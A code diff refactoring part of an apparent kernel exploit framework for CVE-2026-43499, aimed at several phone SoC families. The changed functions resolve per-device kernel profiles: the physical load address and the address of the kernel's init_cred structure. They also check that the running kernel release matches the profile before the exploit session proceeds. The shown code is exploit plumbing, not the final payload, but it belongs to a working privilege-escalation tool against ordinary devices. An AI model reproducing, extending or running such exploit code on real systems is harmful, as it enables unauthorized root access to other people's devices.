@@ -1,7 +1,13 @@
 #include "backend/cve_2026_43499/bootstrap.hpp"
 
 #include "backend/cve_2026_43499_state.hpp"
-#include "common.h"
+#ifndef _GNU_SOURCE
+#define _GNU_SOURCE
+#endif
+
+#include "kernelsnitch/utils.h"
+#include "session/runtime_config.h"
+
 #include "session/core_session.hpp"
 #include "support/fatal_error.hpp"
 
@@ -56,21 +62,41 @@ namespace ghostlock::backend {
         pr_info("debug.execution.end\n");
     }
 
+    namespace {
+        /* Neutral view of the resolved profile for memory::AddressSpace: memory
+         * must not know profile/backend types (ADR-0004 R1). A default value
+         * (null uname_r) reproduces the old not-loaded -> EINVAL behavior. */
+        memory::LaunchGeometry launch_geometry_from(const profile::TargetProfile &profile) {
+            memory::LaunchGeometry geometry{};
+            const profile::kernel_offsets *values = profile.values();
+            if (!values) return geometry;
+            geometry.uname_r = values->uname_r;
+            geometry.kernel_phys_load = values->misc.kernel_phys_load;
+            geometry.kernel_phys_offset = values->misc.kernel_phys_offset;
+            geometry.init_cred_offset = values->offsets.init_cred;
+            return geometry;
+        }
+    } // namespace
+
     /* Entries carry a phys load address only when measured; otherwise MTK uses
      * the DRAM base, xring its constant, qcom its GKI version. */
     void resolve_profile_addresses(void) {
-        if (ghostlock::backend::cve43499_state(session::g_exploit_session).addresses.init(&ghostlock::backend::cve43499_state(session::g_exploit_session).profile) != 0)
+        Cve2026_43499State &state =
+                ghostlock::backend::cve43499_state(session::g_exploit_session);
+        const memory::LaunchGeometry geometry = launch_geometry_from(state.profile);
+        if (state.addresses.init(geometry) != 0)
             throw FatalError{};
         pr_info("soc: %s; kernel_phys_load=0x%llx\n",
-                ghostlock::backend::cve43499_state(session::g_exploit_session).addresses.soc_name(&ghostlock::backend::cve43499_state(session::g_exploit_session).profile),
-                (unsigned long long) ghostlock::backend::cve43499_state(session::g_exploit_session).addresses.phys_load());
+                state.addresses.soc_name(geometry),
+                (unsigned long long) state.addresses.phys_load());
         pr_info("init_cred image=%016zx alias=%016zx\n",
-                (size_t) ghostlock::backend::cve43499_state(session::g_exploit_session).addresses.init_cred_image_addr(),
-                (size_t) ghostlock::backend::cve43499_state(session::g_exploit_session).addresses.data_alias(
-                    ghostlock::backend::cve43499_state(session::g_exploit_session).addresses.init_cred_image_addr()));
+                (size_t) state.addresses.init_cred_image_addr(),
+                (size_t) state.addresses.data_alias(state.addresses.init_cred_image_addr()));
     }
 
-    void install_profile(const profile::kernel_offsets &decoded) {
+    void install_profile() {
+        const char *release =
+                ghostlock::backend::cve43499_state(session::g_exploit_session).profile.release();
         struct utsname uts;
         if (uname(&uts) < 0) throw FatalError{};
         pr_info("kernel: %s\n", uts.release);
@@ -81,14 +107,14 @@ namespace ghostlock::backend {
             throw FatalError{};
         }
 #endif
-        if (!decoded.uname_r || std::string_view(decoded.uname_r) != uts.release) {
+        if (std::string_view(release) != uts.release) {
             pr_error("profile release mismatch: expected %s, got %s\n", uts.release,
-                     decoded.uname_r ? decoded.uname_r : "<missing>");
+                     release[0] != '\0' ? release : "<missing>");
             throw FatalError{};
         }
         /* PROFILE-SUGGEST-01: execution tuning arrives fully merged from Kotlin;
-         * the native side only consumes the resolved values. */
-        ghostlock::backend::cve43499_state(session::g_exploit_session).profile = profile::TargetProfile::from(&decoded);
+         * the native side only consumes the resolved values. The frozen profile
+         * was already bound and installed by state_from. */
         pr_success("resolved profile loaded: %s\n",
                    ghostlock::backend::cve43499_state(session::g_exploit_session).profile.release());
         if (config::runtime_config_snapshot().apply_profile(&ghostlock::backend::cve43499_state(session::g_exploit_session).profile) != 0)
